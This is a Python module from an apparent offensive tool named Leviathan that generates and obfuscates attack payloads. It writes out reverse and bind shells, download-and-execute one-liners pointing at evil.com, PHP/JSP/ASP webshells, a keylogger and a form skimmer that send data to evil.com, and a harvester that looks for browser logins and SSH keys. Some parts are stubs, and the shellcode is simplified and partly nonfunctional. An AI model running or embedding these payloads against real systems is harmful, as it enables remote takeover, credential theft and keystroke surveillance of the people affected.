"""Payload generation and encoding module for Leviathan."""

import base64
import binascii
import random
import string
import struct
from typing import Dict, List, Any, Optional, Union
from pathlib import Path

from ...core.module_base import AnalysisModule
from ...utils.logging import get_logger


class PayloadGenerator(AnalysisModule):
    """Module for generating and encoding exploitation payloads."""

    def __init__(self, config=None):
        super().__init__(config)
        self.logger = get_logger("leviathan.exploitation.payload_generator")

        # Encoder registry
        self.encoders = {
            "base64": self._encode_base64,
            "hex": self._encode_hex,
            "url": self._encode_url,
            "rot13": self._encode_rot13,
            "xor": self._encode_xor,
            "shellcode": self._encode_shellcode
        }

    @property
    def name(self) -> str:
        return "payload_generator"

    @property
    def description(self) -> str:
        return "Generates and encodes exploitation payloads"

    async def analyze(self, target: Any) -> Dict[str, Any]:
        """Generate payloads based on target requirements."""
        if not isinstance(target, dict):
            raise ValueError("Target must be a configuration dictionary")

        payload_specs = target.get("payload_specs", [])
        encoding_config = target.get("encoding_config", {})
        generation_config = target.get("generation_config", {})

        if not payload_specs:
            self.logger.warning("No payload specifications provided")
            return {
                "module": self.name,
                "payloads_generated": 0,
                "warnings": ["No payload specifications provided"]
            }

        self.logger.info(
            "Starting payload generation",
            specs=len(payload_specs),
            encoders=list(encoding_config.keys())
        )

        # Generate payloads
        payloads = []
        for spec in payload_specs:
            try:
                generated = await self._generate_payload(spec, generation_config)
                if generated:
                    payloads.extend(generated)
            except Exception as e:
                self.logger.error("Failed to generate payload", spec=str(spec), error=str(e))

        # Apply encodings
        encoded_payloads = []
        for payload in payloads:
            try:
                encoded = await self._apply_encodings(payload, encoding_config)
                encoded_payloads.append(encoded)
            except Exception as e:
                self.logger.error("Failed to encode payload", payload_id=payload.get("id"), error=str(e))
                encoded_payloads.append(payload)  # Add unencoded if encoding fails

        return {
            "module": self.name,
            "payloads_generated": len(payloads),
            "payloads_encoded": len(encoded_payloads),
            "payloads": encoded_payloads,
            "encoders_used": list(encoding_config.keys())
        }

    async def _generate_payload(self, spec: Dict[str, Any], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate a payload based on specification."""
        payload_type = spec.get("type", "generic")
        size = spec.get("size", 100)
        architecture = spec.get("architecture", "x86_64")

        self.logger.debug("Generating payload", type=payload_type, size=size, arch=architecture)

        payloads = []

        if payload_type == "shellcode":
            payloads.append(await self._generate_shellcode_payload(spec, config))
        elif payload_type == "webshell":
            payloads.append(await self._generate_webshell_payload(spec, config))
        elif payload_type == "reverse_shell":
            payloads.append(await self._generate_reverse_shell_payload(spec, config))
        elif payload_type == "bind_shell":
            payloads.append(await self._generate_bind_shell_payload(spec, config))
        elif payload_type == "download_execute":
            payloads.append(await self._generate_download_execute_payload(spec, config))
        elif payload_type == "keylogger":
            payloads.append(await self._generate_keylogger_payload(spec, config))
        elif payload_type == "credential_harvester":
            payloads.append(await self._generate_credential_harvester_payload(spec, config))
        else:
            # Generic payload
            payloads.append(await self._generate_generic_payload(spec, config))

        return payloads

    async def _generate_shellcode_payload(self, spec: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate shellcode payload."""
        architecture = spec.get("architecture", "x86_64")
        shell_type = spec.get("shell_type", "execve")

        # Generate shellcode based on architecture and type
        shellcode = self._generate_shellcode(architecture, shell_type)

        return {
            "id": f"shellcode_{architecture}_{shell_type}_{random.randint(1000, 9999)}",
            "type": "shellcode",
            "architecture": architecture,
            "shell_type": shell_type,
            "raw_payload": shellcode,
            "size": len(shellcode),
            "format": "binary",
            "generated_at": "2026-01-01T00:00:00Z"
        }

    async def _generate_webshell_payload(self, spec: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate webshell payload."""
        language = spec.get("language", "php")
        functionality = spec.get("functionality", ["exec", "upload"])

        if language.lower() == "php":
            code = self._generate_php_webshell(functionality)
        elif language.lower() == "jsp":
            code = self._generate_jsp_webshell(functionality)
        elif language.lower() == "asp":
            code = self._generate_asp_webshell(functionality)
        else:
            code = f"// Unsupported language: {language}"

        return {
            "id": f"webshell_{language}_{random.randint(1000, 9999)}",
            "type": "webshell",
            "language": language,
            "functionality": functionality,
            "raw_payload": code,
            "size": len(code),
            "format": "text",
            "generated_at": "2026-01-01T00:00:00Z"
        }

    async def _generate_reverse_shell_payload(self, spec: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate reverse shell payload."""
        host = spec.get("host", "127.0.0.1")
        port = spec.get("port", 4444)
        shell_type = spec.get("shell_type", "bash")

        if shell_type == "bash":
            payload = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        elif shell_type == "python":
            payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        elif shell_type == "perl":
            payload = f"""perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
        else:
            payload = f"netcat reverse shell to {host}:{port}"

        return {
            "id": f"reverse_shell_{shell_type}_{random.randint(1000, 9999)}",
            "type": "reverse_shell",
            "host": host,
            "port": port,
            "shell_type": shell_type,
            "raw_payload": payload,
            "size": len(payload),
            "format": "text",
            "generated_at": "2026-01-01T00:00:00Z"
        }

    async def _generate_bind_shell_payload(self, spec: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate bind shell payload."""
        port = spec.get("port", 4444)
        shell_type = spec.get("shell_type", "bash")

        if shell_type == "bash":
            payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l {port} >/tmp/f"
        elif shell_type == "python":
            payload = f"""python -c 'import socket, subprocess, os; s=socket.socket(); s.bind(("0.0.0.0", {port})); s.listen(1); c,a = s.accept(); os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'"""
        else:
            payload = f"bind shell on port {port}"

        return {
            "id": f"bind_shell_{shell_type}_{random.randint(1000, 9999)}",
            "type": "bind_shell",
            "port": port,
            "shell_type": shell_type,
            "raw_payload": payload,
            "size": len(payload),
            "format": "text",
            "generated_at": "2026-01-01T00:00:00Z"
        }

    async def _generate_download_execute_payload(self, spec: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate download and execute payload."""
        url = spec.get("url", "http://evil.com/payload")
        execute_method = spec.get("execute_method", "direct")

        if execute_method == "powershell":
            payload = f"""powershell -c "IEX (New-Object Net.WebClient).DownloadString('{url}')\""""
        elif execute_method == "wget":
            payload = f"wget {url} -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload"
        elif execute_method == "curl":
            payload = f"curl {url} -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload"
        elif execute_method == "python":
            payload = f"""python -c "import urllib2; exec urllib2.urlopen('{url}').read()\""""
        else:
            payload = f"download and execute from {url}"

        return {
            "id": f"download_exec_{execute_method}_{random.randint(1000, 9999)}",
            "type": "download_execute",
            "url": url,
            "execute_method": execute_method,
            "raw_payload": payload,
            "size": len(payload),
            "format": "text",
            "generated_at": "2026-01-01T00:00:00Z"
        }

    async def _generate_keylogger_payload(self, spec: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate keylogger payload."""
        language = spec.get("language", "python")
        exfil_method = spec.get("exfil_method", "file")

        if language == "python":
            code = self._generate_python_keylogger(exfil_method)
        elif language == "c":
            code = self._generate_c_keylogger(exfil_method)
        else:
            code = f"# Keylogger in {language} - placeholder"

        return {
            "id": f"keylogger_{language}_{random.randint(1000, 9999)}",
            "type": "keylogger",
            "language": language,
            "exfil_method": exfil_method,
            "raw_payload": code,
            "size": len(code),
            "format": "text",
            "generated_at": "2026-01-01T00:00:00Z"
        }

    async def _generate_credential_harvester_payload(self, spec: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate credential harvester payload."""
        target_type = spec.get("target_type", "web")
        exfil_method = spec.get("exfil_method", "http")

        if target_type == "web":
            code = self._generate_web_credential_harvester(exfil_method)
        elif target_type == "system":
            code = self._generate_system_credential_harvester(exfil_method)
        else:
            code = f"# Credential harvester for {target_type} - placeholder"

        return {
            "id": f"cred_harvester_{target_type}_{random.randint(1000, 9999)}",
            "type": "credential_harvester",
            "target_type": target_type,
            "exfil_method": exfil_method,
            "raw_payload": code,
            "size": len(code),
            "format": "text",
            "generated_at": "2026-01-01T00:00:00Z"
        }

    async def _generate_generic_payload(self, spec: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate generic payload."""
        size = spec.get("size", 100)
        payload_type = spec.get("payload_type", "random")

        if payload_type == "random":
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
        elif payload_type == "pattern":
            payload = "A" * size
        else:
            payload = f"Generic payload of size {size}"

        return {
            "id": f"generic_{payload_type}_{random.randint(1000, 9999)}",
            "type": "generic",
            "payload_type": payload_type,
            "size": size,
            "raw_payload": payload,
            "format": "text",
            "generated_at": "2026-01-01T00:00:00Z"
        }

    async def _apply_encodings(self, payload: Dict[str, Any], encoding_config: Dict[str, Any]) -> Dict[str, Any]:
        """Apply encodings to a payload."""
        encoded_payload = payload.copy()
        raw_payload = payload.get("raw_payload", "")

        # Apply each requested encoding
        for encoder_name, encoder_config in encoding_config.items():
            if encoder_name in self.encoders:
                try:
                    encoded_data = self.encoders[encoder_name](raw_payload, encoder_config)
                    encoded_payload[f"encoded_{encoder_name}"] = encoded_data
                    encoded_payload["encodings_applied"] = encoded_payload.get("encodings_applied", [])
                    encoded_payload["encodings_applied"].append(encoder_name)
                except Exception as e:
                    self.logger.warning("Encoding failed", encoder=encoder_name, error=str(e))

        return encoded_payload

    def _encode_base64(self, data: str, config: Dict[str, Any]) -> str:
        """Base64 encode data."""
        if isinstance(data, str):
            data = data.encode()
        return base64.b64encode(data).decode()

    def _encode_hex(self, data: str, config: Dict[str, Any]) -> str:
        """Hex encode data."""
        if isinstance(data, str):
            data = data.encode()
        return binascii.hexlify(data).decode()

    def _encode_url(self, data: str, config: Dict[str, Any]) -> str:
        """URL encode data."""
        from urllib.parse import quote
        return quote(data)

    def _encode_rot13(self, data: str, config: Dict[str, Any]) -> str:
        """ROT13 encode data."""
        return data.encode().decode('rot13')

    def _encode_xor(self, data: str, config: Dict[str, Any]) -> str:
        """XOR encode data."""
        key = config.get("key", 0xAA)
        if isinstance(data, str):
            data = data.encode()
        encoded = bytes(b ^ key for b in data)
        return binascii.hexlify(encoded).decode()

    def _encode_shellcode(self, data: str, config: Dict[str, Any]) -> str:
        """Encode data as shellcode format."""
        if isinstance(data, str):
            data = data.encode()
        return ''.join(f'\\x{b:02x}' for b in data)

    def _generate_shellcode(self, arch: str, shell_type: str) -> bytes:
        """Generate actual shellcode bytes."""
        # This is a simulation - real shellcode would be architecture-specific
        if arch == "x86_64":
            if shell_type == "execve":
                # x86_64 execve /bin/sh shellcode (simplified)
                return b'\x48\x31\xff\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\x48\x31\xc9\xb0\x3b\x0f\x05'
            elif shell_type == "reverse_tcp":
                # Placeholder for reverse TCP shellcode
                return b'\x48\x31\xc0' * 10
        elif arch == "x86":
            if shell_type == "execve":
                # x86 execve /bin/sh shellcode (simplified)
                return b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

        # Default NOP sled
        return b'\x90' * 100

    def _generate_php_webshell(self, functionality: List[str]) -> str:
        """Generate PHP webshell."""
        code = "<?php\n"

        if "exec" in functionality:
            code += """
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
"""

        if "upload" in functionality:
            code += """
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
"""

        if "info" in functionality:
            code += """
phpinfo();
"""

        code += "?>\n"
        return code

    def _generate_jsp_webshell(self, functionality: List[str]) -> str:
        """Generate JSP webshell."""
        code = "<%\n"

        if "exec" in functionality:
            code += """
if(request.getParameter("cmd") != null) {
    Runtime.getRuntime().exec(request.getParameter("cmd"));
}
"""

        code += "%>\n"
        return code

    def _generate_asp_webshell(self, functionality: List[str]) -> str:
        """Generate ASP webshell."""
        code = "<%\n"

        if "exec" in functionality:
            code += """
If Request.QueryString(\"cmd\") <> \"\" Then
    Shell(Request.QueryString(\"cmd\"))
End If
"""

        code += "%>\n"
        return code

    def _generate_python_keylogger(self, exfil_method: str) -> str:
        """Generate Python keylogger."""
        code = """
import keyboard
import requests

log = ""

def on_press(key):
    global log
    log += key.name
    if len(log) > 100:
        send_log(log)
        log = ""

def send_log(data):
"""

        if exfil_method == "http":
            code += """
    requests.post('http://evil.com/log', data={'log': data})
"""
        elif exfil_method == "file":
            code += """
    with open('/tmp/keylog.txt', 'a') as f:
        f.write(data + '\\n')
"""

        code += """
keyboard.on_press(on_press)
keyboard.wait()
"""
        return code

    def _generate_c_keylogger(self, exfil_method: str) -> str:
        """Generate C keylogger."""
        return """
// C keylogger placeholder
#include <stdio.h>
#include <X11/Xlib.h>

int main() {
    // Keylogger implementation would go here
    printf("Keylogger started\\n");
    return 0;
}
"""

    def _generate_web_credential_harvester(self, exfil_method: str) -> str:
        """Generate web credential harvester."""
        return """
// Web credential harvester
document.addEventListener('submit', function(e) {
    var form = e.target;
    var data = new FormData(form);

    // Send credentials to attacker
    fetch('http://evil.com/creds', {
        method: 'POST',
        body: data
    });
});
"""

    def _generate_system_credential_harvester(self, exfil_method: str) -> str:
        """Generate system credential harvester."""
        return """
# System credential harvester
import os
import requests

# Harvest browser credentials, SSH keys, etc.
creds = {}

# Chrome passwords (simplified)
chrome_path = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
if os.path.exists(chrome_path):
    creds['chrome'] = 'harvested'

# SSH keys
ssh_path = os.path.expanduser('~/.ssh')
if os.path.exists(ssh_path):
    creds['ssh_keys'] = os.listdir(ssh_path)

# Send to attacker
requests.post('http://evil.com/sys_creds', json=creds)
"""

    def add_encoder(self, name: str, encoder_func: callable) -> None:
        """Add a custom encoder."""
        self.encoders[name] = encoder_func
        self.logger.info("Added custom encoder", name=name)

    def remove_encoder(self, name: str) -> None:
        """Remove an encoder."""
        if name in self.encoders:
            del self.encoders[name]
            self.logger.info("Removed encoder", name=name)